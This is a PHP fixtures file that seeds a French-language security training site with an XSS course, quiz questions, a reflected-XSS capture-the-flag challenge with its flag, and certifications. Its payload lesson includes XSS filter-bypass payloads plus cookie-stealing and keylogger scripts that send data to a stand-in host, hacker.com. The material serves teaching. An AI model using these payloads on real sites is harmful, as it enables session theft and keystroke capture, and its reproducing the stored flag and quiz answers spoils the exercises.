<?php

namespace App\DataFixtures;

use App\Entity\Categorie;
use App\Entity\Certification;
use App\Entity\Challenge;
use App\Entity\Course;
use App\Entity\Module;
use App\Entity\Task;
use App\Entity\TaskQuestion;
use Doctrine\Bundle\FixturesBundle\Fixture;
use Doctrine\Persistence\ObjectManager;


class AppFixtures extends Fixture
{
    public function load(ObjectManager $manager): void
    {
        $categoriesData = [
            [
                "name" => "Web"
            ],
            [
                "name" => "Network"
            ],
            [
                "name" => "Crypto"
            ]
        ];

        $categories = [];
        foreach ($categoriesData as $categorieData) {
            $categorie = new Categorie();
            $categorie->setName($categorieData["name"]);
            $manager->persist($categorie);
            $categories[] = $categorie;
        }


        $coursesData = [
            ["name" => "XSS - Cross Site Scripting", "point" => 25],
            ["name" => "SQL Injection", "point" => 25],
        ];

        $courses = [];
        foreach ($coursesData as $courseData) {
            $course = new Course();
            $course->setName($courseData["name"]);
            $course->setPoint($courseData['point']);
            $manager->persist($course);
            $courses[] = $course;
        }

        $tasksData = [
            [
                "name" => "Introduction",
                "content" => "## Qu'est-ce que le XSS ?\n\nLe Cross-Site Scripting (XSS) est l'une des vulnérabilités web les plus répandues et les plus dangereuses. Elle figure régulièrement dans le **Top 10 de l'OWASP** depuis plus de 10 ans.\n\nLe principe est simple : un attaquant parvient à injecter du code JavaScript malveillant dans une page web consultée par d'autres utilisateurs. Ce code s'exécute dans le navigateur de la victime avec ses propres droits.\n\n## Pourquoi c'est dangereux ?\n\n- Vol de cookies de session\n- Redirection vers des sites malveillants\n- Modification du contenu de la page\n- Keylogging (enregistrement des frappes clavier)\n- Exécution d'actions à la place de la victime\n\n## Les 3 types de XSS\n\n### Reflected XSS\nLe payload est inclus dans la requête HTTP et renvoyé immédiatement par le serveur. La victime doit cliquer sur un lien malveillant.\n\n### Stored XSS\nLe payload est stocké en base de données et affiché à tous les utilisateurs visitant la page. C'est le plus dangereux.\n\n### DOM-based XSS\nLe payload manipule le DOM directement côté client, sans passer par le serveur.",
                "taskOrder" => 1,
                "courseIndex" => 0
            ],
            [
                "name" => "XSS Payloads",
                "content" => "## Qu'est-ce qu'un payload XSS ?\n\nUn payload XSS est le code JavaScript malveillant qu'un attaquant injecte dans une application vulnérable. Il existe des centaines de variantes selon les protections en place.\n\n## Payloads de base\n\n```html\n<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n<svg onload=alert('XSS')>\n<body onload=alert('XSS')>\n```\n\n## Contournement des filtres\n\nCertaines applications filtrent les balises `<script>`. Il existe des alternatives :\n\n```html\n<ScRiPt>alert('XSS')</ScRiPt>\n<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">\n<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>\n```\n\n## Vol de cookies\n\n```javascript\n<script>\n  fetch('https://hacker.com/steal?c=' + btoa(document.cookie));\n</script>\n```\n\n## Keylogger XSS\n\n```javascript\n<script>\n  document.onkeypress = function(e) {\n    fetch('https://hacker.com/log?k=' + e.key);\n  }\n</script>\n```",
                "taskOrder" => 2,
                "courseIndex" => 0
            ],
            [
                "name" => "Se protéger",
                "content" => "## L'échappement des données (Output Encoding)\n\nLa première ligne de défense est d'échapper toutes les données affichées dans le HTML.\n\n```php\n// PHP\necho htmlspecialchars(\$data, ENT_QUOTES, 'UTF-8');\n\n// En Twig (Symfony) - automatique\n{{ variable }}\n\n// En JavaScript\nelement.textContent = data; // safe\nelement.innerHTML = data;   // DANGEREUX\n```\n\n## Content Security Policy (CSP)\n\nLa CSP est un header HTTP qui indique au navigateur quelles sources de scripts sont autorisées.\n\n```\nContent-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'\n```\n\n## Cookies HttpOnly et Secure\n\n```\nSet-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict\n```\n\n- **HttpOnly** : empêche JavaScript d'accéder au cookie\n- **Secure** : cookie uniquement en HTTPS\n- **SameSite** : protège contre le CSRF\n\n## Validation des entrées\n\n```php\n// Valider le type\nfilter_var(\$email, FILTER_VALIDATE_EMAIL);\n\n// Utiliser une whitelist\nif (!in_array(\$color, ['red', 'green', 'blue'])) {\n    throw new Exception('Invalid color');\n}\n```",
                "taskOrder" => 3,
                "courseIndex" => 0
            ],
            [
                "name" => "Outils",
                "content" => "## Burp Suite\n\nL'outil incontournable du pentester web. Il permet d'intercepter et modifier les requêtes HTTP.\n\n- **Proxy** : intercepte le trafic\n- **Scanner** : détecte les vulnérabilités automatiquement\n- **Repeater** : rejoue et modifie des requêtes\n- **Intruder** : fuzzing automatisé\n\n## XSStrike\n\nOutil Python spécialisé dans la détection et l'exploitation de XSS.\n\n```bash\ngit clone https://github.com/s0md3v/XSStrike\ncd XSStrike\npip3 install -r requirements.txt\npython3 xsstrike.py -u 'http://target.com/search?q=test'\n```\n\n## Dalfox\n\nOutil Go très rapide pour la détection de XSS.\n\n```bash\n# Installation\ngo install github.com/hahwul/dalfox/v2@latest\n\n# Scan basique\ndalfox url 'http://target.com/search?q=test'\n\n# Avec cookie d'authentification\ndalfox url 'http://target.com/search?q=test' --cookie 'session=abc123'\n```\n\n## Browser DevTools\n\nLes outils de développement du navigateur sont essentiels :\n\n- **Console** : tester des payloads JavaScript\n- **Network** : analyser les requêtes\n- **Application** : voir les cookies et le stockage",
                "taskOrder" => 4,
                "courseIndex" => 0
            ],
            [
                "name" => "Conclusion",
                "content" => "## Récapitulatif du module\n\nTu as appris :\n\n✅ Les **3 types de XSS** : Reflected, Stored, DOM-based\n\n✅ Les **payloads** les plus courants et les techniques de bypass\n\n✅ Les **mécanismes de protection** : output encoding, CSP, HttpOnly\n\n✅ Les **outils** utilisés par les pentesters : Burp Suite, XSStrike, Dalfox\n\n## Passage au challenge\n\nIl est temps de mettre en pratique tes connaissances !\n\nTu vas devoir exploiter une faille **XSS Reflected** pour récupérer un flag caché dans les cookies de la page.\n\n### Indices\n\n> 💡 La page est vulnérable au paramètre `q` dans l'URL\n\n> 💡 Le flag est stocké dans `document.cookie`\n\n> 💡 Utilise `alert(document.cookie)` pour l'afficher\n\n### URL cible\n\n```\nhttp://127.0.0.1:8000/lab/xss?q=PAYLOAD\n```\n\nBonne chance ! 🎯",
                "taskOrder" => 5,
                "courseIndex" => 0
            ],
        ];

        $tasks = [];
        foreach ($tasksData as $taskData) {
            $task = new Task();
            $task->setName($taskData["name"]);
            $task->setContent($taskData['content']);
            $task->setTaskOrder($taskData["taskOrder"]);
            $task->setCourse($courses[$taskData["courseIndex"]]);
            $manager->persist($task);
            $tasks[] = $task;
        };


        $taskQuestionData = [
            // Introduction
            ["name" => "Quel organisme publie le Top 10 des vulnérabilités web ?", "answer" => "OWASP", "questionOrder" => 1, "taskIndex" => 0],
            ["name" => "Quel type de XSS persiste en base de données ?", "answer" => "Stored XSS", "questionOrder" => 2, "taskIndex" => 0],
            ["name" => "Dans quel environnement s'exécute le code injecté par le XSS ?", "answer" => "Navigateur", "questionOrder" => 3, "taskIndex" => 0],
            // XSS Payloads
            ["name" => "Quelle propriété JavaScript contient les cookies de session ?", "answer" => "document.cookie", "questionOrder" => 1, "taskIndex" => 1],
            ["name" => "Quelle balise HTML alternative peut déclencher du JavaScript ?", "answer" => "img", "questionOrder" => 2, "taskIndex" => 1],
            ["name" => "Quelle fonction JavaScript permet de décoder du base64 ?", "answer" => "atob", "questionOrder" => 3, "taskIndex" => 1],
            // Se protéger
            ["name" => "Quelle fonction PHP échappe les caractères spéciaux HTML ?", "answer" => "htmlspecialchars", "questionOrder" => 1, "taskIndex" => 2],
            ["name" => "Quel flag de cookie empêche JavaScript d'y accéder ?", "answer" => "HttpOnly", "questionOrder" => 2, "taskIndex" => 2],
            ["name" => "Quel header HTTP permet de restreindre les sources de scripts ?", "answer" => "Content-Security-Policy", "questionOrder" => 3, "taskIndex" => 2],
            // Outils
            ["name" => "Quel outil Burp Suite permet de rejouer des requêtes modifiées ?", "answer" => "Repeater", "questionOrder" => 1, "taskIndex" => 3],
            ["name" => "Dans quel langage est écrit Dalfox ?", "answer" => "Go", "questionOrder" => 2, "taskIndex" => 3],
            ["name" => "Quelle section des DevTools permet de voir les cookies ?", "answer" => "Application", "questionOrder" => 3, "taskIndex" => 3],
        ];

        $taskQuestions = [];
        foreach ($taskQuestionData as $taskQData) {
            $taskQuestion = new TaskQuestion();
            $taskQuestion->setName($taskQData["name"]);
            $taskQuestion->setAnswer($taskQData["answer"]);
            $taskQuestion->setQuestionOrder($taskQData["questionOrder"]);
            $taskQuestion->setTask($tasks[$taskQData["taskIndex"]]);
            $manager->persist($taskQuestion);
            $taskQuestions[] = $taskQuestion;
        }

        $challengesData = [
            [
                "name" => "XSS Challenge",
                "content" => "## Objectif\n\nUne application web affiche le contenu d'un paramètre URL directement dans la page sans le filtrer.\n\n## Contexte\n\nTu as accès à une page de recherche vulnérable. Le paramètre `q` est reflété directement dans le HTML sans échappement.\n\n## Mission\n\nExploite la faille XSS Reflected pour exécuter du JavaScript dans le navigateur et récupère le flag caché dans les cookies de la page.\n\n## Indice\n\nUtilise `document.cookie` pour accéder aux cookies.",
                "point" => 100,
                "flag" => "flag{xss_r3fl3ct3d_f0und}"
            ],
        ];

        $challenges = [];
        foreach ($challengesData as $challengeData) {
            $challenge = new Challenge();
            $challenge->setName($challengeData['name']);
            $challenge->setContent($challengeData["content"]);
            $challenge->setPoint($challengeData["point"]);
            $challenge->setFlag($challengeData["flag"]);
            $manager->persist($challenge);
            $challenges[] = $challenge;
        }


        $modulesData = [
            [
                "name" => "XSS - Introduction",
                "description" => "Apprends les bases des attaques XSS (Cross-Site Scripting) et comment les exploiter.",
                "difficulty" => "Facile",
                "courseIndex" => 0,
                "challengeIndex" => 0,
                "categorieIndex" => 0
            ]
        ];

        $modules = [];
        foreach ($modulesData as $moduleData) {
            $module = new Module();
            $module->setName($moduleData["name"]);
            $module->setDescription($moduleData["description"]);
            $module->setDifficulty($moduleData["difficulty"]);
            $module->setCourse($courses[$moduleData["courseIndex"]]);
            $module->setChallenge($challenges[$moduleData['challengeIndex']]);
            $module->setCategorie($categories[$moduleData["categorieIndex"]]);
            $manager->persist($module);
            $modules[] = $module;
        }

        $certificationsData = [
            [
                "name" => "Pentester",
                "image" => "/images/certifications/pentester.png",
                "moduleIndex" => null,
                "description" => "Maîtrise les techniques offensives : reconnaissance, exploitation web, injection SQL, XSS et capture de flags en conditions réelles."
            ],
            [
                "name" => "Defender",
                "image" => "/images/certifications/defender.png",
                "moduleIndex" => null,
                "description" => "Apprends à détecter, analyser et contrer les attaques. Configuration sécurisée, analyse de logs et réponse aux incidents."
            ],
        ];

        $certifications = [];
        foreach ($certificationsData as $certificationData) {
            $certification = new Certification();
            $certification->setName($certificationData["name"]);
            $certification->setImage($certificationData["image"]);
            $certification->setDescription($certificationData["description"]);
            if ($certificationData["moduleIndex"] !== null) {
                $certification->setModule($modules[$certificationData["moduleIndex"]]);
            }
            $manager->persist($certification);
            $certifications[] = $certification;
        }

        $manager->flush();
    }
}
